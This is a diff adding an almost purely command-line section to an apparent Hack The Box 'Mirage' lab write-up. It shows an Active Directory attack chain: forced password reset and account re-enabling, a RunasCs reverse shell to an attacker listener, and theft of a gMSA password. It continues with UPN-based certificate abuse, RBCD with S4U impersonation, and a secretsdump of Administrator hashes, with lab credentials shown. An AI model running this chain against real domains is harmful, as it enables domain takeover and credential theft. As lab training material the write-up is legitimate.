@@ -323,6 +323,252 @@ Password for nathan.aadam@MIRAGE.HTB:
 
 
 
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getTGT mirage.htb/mark.bbond:'1day@atime'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in mark.bbond.ccache
+                                                                                                                                                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=mark.bbond.ccache 
+                                                                                                                                                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password JAVIER.MMARSHALL 'NewPassword1234!'
+[+] Password changed successfully!
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' get object "javier.mmarshall" --attr userAccountControl
+
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+                                                                                                                                                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k remove uac JAVIER.MMARSHALL -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from JAVIER.MMARSHALL's userAccountControl
+                                                                                                                                                                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' get object "javier.mmarshall" --attr userAccountControl
+
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+
+└─$ impacket-getTGT mirage.htb/javier.mmarshall:'NewPassword1234!'                                                                                     
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+
+
+```
+## fix  KDC_ERR_CLIENT_REVOKED by set logonHours
+
+```
+┌──(kali㉿kali)-[~/AD-tools]
+└─$ kinit nathan.aadam@MIRAGE.HTB              
+Password for nathan.aadam@MIRAGE.HTB: 
+                                             
+┌──(kali㉿kali)-[~/AD-tools]
+└─$ evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB
+
+*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> upload RunasCs.exe
+./RunasCs.exe mark.bbond 1day@atime powershell -r 10.10.14.26:4444
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+
+PS C:\> Set-ADUser javier.mmarshall -Replace @{logonHours=[byte[]]@(255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255)}
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' get object "javier.mmarshall"  --attr userAccountControl,logonHours 
+
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+logonHours: ////////////////////////////
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+
+
+──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' get object "javier.mmarshall"  --attr userAccountControl,logonHours 
+
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+logonHours: ////////////////////////////
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+
+
+```
+
+
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ kinit javier.mmarshall@MIRAGE.HTB                        
+Password for javier.mmarshall@MIRAGE.HTB: 
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'NewPassword1234!' get object 'Mirage-Service$' --attr msDS-ManagedPassword  
+
+distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
+msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
+
+
+```
+
+
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Mirage-Service\$.ccache 
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ certipy account update \
+  -user 'mark.bbond' \
+  -upn 'dc01$@mirage.htb' \
+  -u 'mirage-service$@mirage.htb' \
+  -k -no-pass \
+  -dc-ip $IP \
+  -target dc01.mirage.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'mark.bbond':
+    userPrincipalName                   : dc01$@mirage.htb
+[*] Successfully updated 'mark.bbond'
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+export KRB5CCNAME=mark.bbond.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+export KRB5CCNAME=mark.bbond.ccache 
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip $IP -dc-host dc01.mirage.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 19
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'dc01$@mirage.htb'
+[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Saving certificate and private key to 'dc01.pfx'
+File 'dc01.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'dc01.pfx'
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Mirage-Service\$.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ certipy-ad account \
+  -u 'mirage-service$' \
+  -k -no-pass \
+  -target 'dc01.mirage.htb' \
+  -upn 'mark.bbond@mirage.htb' \
+  -user 'mark.bbond' \
+  update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc01.mirage.htb.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'mark.bbond':
+    userPrincipalName                   : mark.bbond@mirage.htb
+[*] Successfully updated 'mark.bbond'
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ certipy auth -pfx dc01.pfx -dc-ip $IP -ldap-shell
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'dc01$@mirage.htb'
+[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Connecting to 'ldaps://10.10.11.78:636'
+[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
+Type help for list of commands
+
+# whoami
+u:MIRAGE\DC01$
+
+# set_rbcd dc01$ Mirage-Service$
+Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
+Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
+
+Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
+Currently allowed sids:
+    S-1-5-21-2127163471-3824721834-2568365109-1112
+Grantee is already permitted to perform delegation to the target host
+
+# exit
+Bye!
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getTGT -dc-ip $IP "mirage.htb/Mirage-Service$" -hashes :305806d84f7c1be93a07aaf40f0c7866
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Mirage-Service$.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME='Mirage-Service$.ccache'
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getST -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' -dc-ip $IP  'mirage.htb/Mirage-Service$' -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating dc01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache'
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump 'dc01$'@dc01.mirage.htb -k -no-pass -dc-ip $IP -just-dc-user administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
+[*] Kerberos keys grabbed
+mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
+mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
+mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
+[*] Cleaning up... 
+
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=dc01\$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump 'dc01$'@dc01.mirage.htb -k -no-pass -dc-ip $IP -just-dc-user administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
+[*] Kerberos keys grabbed
+mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
+mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
+mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
+[*] Cleaning up... 
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getTGT -dc-ip $IP "mirage.htb/Administrator" -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Administrator.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Administrator.ccache
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Downloads]
+└─$ evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB
+
+
+```
+![alt text](image-15.png)
 
 
 
